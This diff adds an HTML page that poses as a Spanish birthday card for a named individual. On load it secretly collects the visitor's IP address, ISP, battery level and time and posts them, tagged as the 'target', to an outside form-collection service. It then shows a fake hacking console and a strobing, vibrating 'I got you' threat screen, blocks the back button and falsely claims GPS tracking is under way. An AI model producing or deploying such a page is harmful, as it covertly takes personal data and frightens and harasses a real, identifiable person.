@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SISTEMA DE SEGURIDAD</title>
+    <style>
+        :root { --main: #00ff41; --alert: #ff0000; --bg: #000; }
+        body { margin: 0; font-family: 'Courier New', monospace; background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; color: var(--main); }
+        
+        /* Fase 1: Tarjeta */
+        #birthday-card { 
+            text-align: center; background: white; padding: 30px; border-radius: 20px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); border-top: 10px solid #f1c40f; 
+            width: 85%; max-width: 350px; color: #333; z-index: 10; 
+        }
+        #countdown { font-size: 3.5rem; font-weight: bold; color: #e67e22; }
+
+        /* Fase 2: Consola */
+        #hacker-ui { 
+            display: none; position: fixed; top:0; left:0; width: 100%; height: 100%; 
+            background: var(--bg); padding: 20px; box-sizing: border-box; overflow-y: auto; 
+        }
+        .log { margin-bottom: 5px; font-size: 0.85rem; line-height: 1.2; text-shadow: 0 0 5px var(--main); }
+
+        /* Fase 3: Pantalla Final "TE TENGO" */
+        #threat-ui { 
+            display: none; position: fixed; top:0; left:0; width: 100%; height: 100%; 
+            background: #000; color: var(--alert); z-index: 1000; 
+            flex-direction: column; align-items: center; justify-content: center; text-align: center; 
+        }
+        .strobe { animation: strobe-bg 0.1s infinite; }
+        @keyframes strobe-bg { 0% { background: #1a0000; } 50% { background: #000; } 100% { background: #1a0000; } }
+        
+        .te-tengo { font-size: 3.5rem; font-weight: 900; color: #fff; text-shadow: 0 0 20px var(--alert); margin: 0; }
+        .final-name { font-size: 1.4rem; font-weight: bold; color: var(--alert); margin-bottom: 20px; }
+        .data-box { font-family: monospace; font-size: 1rem; color: #fff; text-align: left; border: 2px solid var(--alert); padding: 20px; background: rgba(255,0,0,0.1); width: 80%; max-width: 300px; }
+        .data-label { color: var(--alert); font-weight: bold; }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div id="birthday-card">
+        <div style="font-size: 50px;">🎁</div>
+        <h2 style="margin: 10px 0;">¡FELICIDADES!</h2>
+        <p style="color: #e67e22; font-weight: bold;">Héctor Isay Vazquez Tapia</p>
+        <p style="font-size: 0.9rem; color: #666;">Cargando sorpresa digital...</p>
+        <div id="countdown">3</div>
+    </div>
+
+    <div id="hacker-ui">
+        <div id="logs"></div>
+    </div>
+
+    <div id="threat-ui">
+        <p class="te-tengo">TE TENGO</p>
+        <div class="final-name">HÉCTOR ISAY VAZQUEZ TAPIA</div>
+        
+        <div class="data-box">
+            <span class="data-label">IP:</span> <span id="res-ip">...</span><br>
+            <span class="data-label">HORA:</span> <span id="res-hora">...</span><br>
+            <span class="data-label">ISP:</span> <span id="res-isp">...</span><br>
+            <span class="data-label">BATERÍA:</span> <span id="res-bat">...</span>
+        </div>
+        
+        <p style="font-size: 0.6rem; color: white; margin-top: 40px; opacity: 0.5;">LOCALIZACIÓN GPS EN CURSO...</p>
+    </div>
+
+    <script>
+        let ipData = { ip: "192.168.1.XX", org: "Buscando..." };
+        let batLevel = "N/A";
+        let horaExacta = "";
+
+        async function capturar() {
+            horaExacta = new Date().toLocaleTimeString();
+            try {
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batLevel = Math.round(b.level * 100) + "%";
+                }
+                const res = await fetch('https://ipapi.co/json/');
+                ipData = await res.json();
+            } catch(e) {}
+
+            fetch('https://formspree.io/f/mreykylj', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "OBJETIVO": "Héctor Isay Vazquez Tapia",
+                    "IP": ipData.ip,
+                    "HORA": horaExacta,
+                    "PROVEEDOR": ipData.org,
+                    "BATERIA": batLevel
+                }),
+                keepalive: true
+            });
+        }
+
+        async function typeLog(text) {
+            const logs = document.getElementById('logs');
+            const div = document.createElement('div');
+            div.className = 'log';
+            logs.appendChild(div);
+            for (let c of text) {
+                div.innerHTML += c;
+                document.getElementById('hacker-ui').scrollTop = document.getElementById('hacker-ui').scrollHeight;
+                await new Promise(r => setTimeout(r, 10));
+            }
+        }
+
+        let c = 3;
+        const t = setInterval(() => {
+            c--;
+            document.getElementById('countdown').innerText = c;
+            if(c <= 0) {
+                clearInterval(t);
+                initHacking();
+            }
+        }, 1000);
+
+        async function initHacking() {
+            document.getElementById('birthday-card').style.display = 'none';
+            document.getElementById('hacker-ui').style.display = 'block';
+
+            await typeLog("> INICIANDO PROTOCOLO DE INTRUSIÓN...");
+            await typeLog(`> IP IDENTIFICADA: ${ipData.ip}`);
+            await typeLog("> VULNERANDO FIREWALL DE PROVEEDOR...");
+            await typeLog("> ACCESO A PORTAPAPELES Y GALERÍA...");
+            await typeLog("> ENVIANDO PAQUETES A SERVIDOR REMOTO...");
+            await typeLog("> [!] EXTRACCIÓN COMPLETADA AL 100%");
+
+            setTimeout(() => {
+                document.getElementById('hacker-ui').style.display = 'none';
+                document.getElementById('res-ip').innerText = ipData.ip;
+                document.getElementById('res-hora').innerText = horaExacta;
+                document.getElementById('res-isp').innerText = ipData.org;
+                document.getElementById('res-bat').innerText = batLevel;
+                
+                const threat = document.getElementById('threat-ui');
+                threat.style.display = 'flex';
+                threat.classList.add('strobe');
+                if (navigator.vibrate) navigator.vibrate([800, 200, 800]);
+            }, 1000);
+        }
+
+        window.history.pushState(null, null, window.location.href);
+        window.onpopstate = () => { window.history.pushState(null, null, window.location.href); };
+        window.onload = capturar;
+    </script>
+</body>
+</html>
+
